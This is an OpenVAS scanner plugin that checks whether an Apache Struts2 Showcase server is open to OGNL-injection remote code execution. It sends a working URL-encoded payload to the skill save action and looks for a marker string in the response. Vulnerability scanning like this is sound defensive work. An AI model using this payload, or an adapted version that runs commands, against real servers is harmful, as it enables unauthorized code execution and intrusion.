##############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_apache_struts_showcase_code_exec_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# Apache Struts2 Showcase Skill Name Remote Code Execution Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2012 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation could allow an attacker to execute arbitrary java
  method. Further that results to disclose environment variables or cause a
  denial of service or an arbitrary OS command can be executed.
  Impact Level: System/Application";
tag_affected = "Apache Struts2 (Showcase) version 2.3.4.1 and prior";

tag_insight = "The flaw is due to an improper validation of user data passed to the
  'skillName' parameter in 'edit' and 'save' actions.";
tag_solution = "No solution or patch is available as of 30th, August 2012. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://struts.apache.org/download.cgi";
tag_summary = "This host is running Apache Struts Showcase and is prone to
  java method execution vulnerability.";

if(description)
{
  script_id(902924);
  script_version("$Revision: 12 $");
  script_bugtraq_id(55165);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-08-31 11:47:31 +0530 (Fri, 31 Aug 2012)");
  script_name("Apache Struts2 Showcase Skill Name Remote Code Execution Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "
  Affected Software/OS:
  " + tag_affected + "
  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/523956");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/115770/struts2-exec.txt");
  script_xref(name : "URL" , value : "http://exploitsdownload.com/exploit/na/apache-struts2-remote-code-execution");

  script_description(desc);
  script_summary("Check if Apache Struts Showcase is vulnerable to remote code execution");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 SecPod");
  script_family("Web application abuses");
  script_require_ports("Services/www", 8080);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


## Get HTTP Port

asport = 0;
asRes = "";
asReq = "";
dir = "";
url = "";

asport = get_http_port(default:8080);
if(!asport){
  asport = 8080 ;
}

## Check the port status
if(!get_port_state(asport)){
  exit(0);
}

## check the possible paths
foreach dir (make_list("", "/struts", "/framework", "/struts2-showcase"))
{

  url = dir + "/showcase.action";
  if(http_vuln_check(port:asport, url:url,pattern:">Showcase</",
                     extra_check:">Struts Showcase<", check_header:TRUE))
  {
    ## Construct the POST data
    postdata = "currentSkill.name=%25%7B%28%23_memberAccess%5B%27allowStatic" +
               "MethodAccess%27%5D%3Dtrue%29%28%23context%5B%27xwork.MethodA" +
               "ccessor.denyMethodExecution%27%5D%3Dfalse%29%28%23tmp%3D%40o" +
               "rg.apache.struts2.ServletActionContext%40getResponse%28%29.g" +
               "etWriter%28%29%2C%23tmp.println%28%27RCEWorked%27%29%2C%23tm" +
               "p.close%28%29%29%7D&currentSkill.description=";

    url = dir + "/skill/save.action";

    ## Construct the POST request
    asReq = string("POST ", url," HTTP/1.1\r\n",
                    "Host: ", get_host_name(), "\r\n",
                    "User-Agent: Remote-Code-Execution\r\n",
                    "Content-Type: application/x-www-form-urlencoded\r\n",
                    "Content-Length: ", strlen(postdata), "\r\n",
                    "\r\n", postdata);
    asRes = http_send_recv(port:asport, data:asReq);

    ## Confirm the exploit
    if(asRes && asRes =~ "HTTP/1\.[0-9]+ 200" && "RCEWorked" >< asRes)
    {
      security_hole(asport);
      exit(0);
    }
  }
}
